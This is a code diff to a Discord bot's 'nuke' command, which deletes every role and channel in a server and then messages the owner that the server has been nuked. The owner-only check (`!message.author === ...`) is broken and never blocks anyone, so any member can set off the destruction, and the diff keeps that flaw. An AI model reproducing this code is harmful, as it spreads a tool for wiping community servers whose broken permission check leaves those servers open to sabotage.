@@ -1009,17 +1009,17 @@ m.sendFile(message.attachments.first().url).catch();
  });
 
 
+
 client.on('message', message => {
     if (message.content.startsWith(prefix + "nuke")) {
-    var king = message.guild.owner;
-    if(!message.author === king) return;
+    if(!message.author === message.guild.owner) return;
    message.guild.roles.forEach(r => { r.delete() }) // لمسح الرتب
    message.guild.channels.forEach(c => { c.delete() })// للمسح الرومات
    let embed = new Discord.RichEmbed()
-   setAuthor('Your server has been nuked.')
+   .setAuthor('Your server has been nuked.')
    .setColor('RANDOM')
    .addField('Name:', `${message.guild.name}`)
-   king.sendEmbed(embed);
+   message.guild.owner.sendEmbed(embed);
    }
    });
 
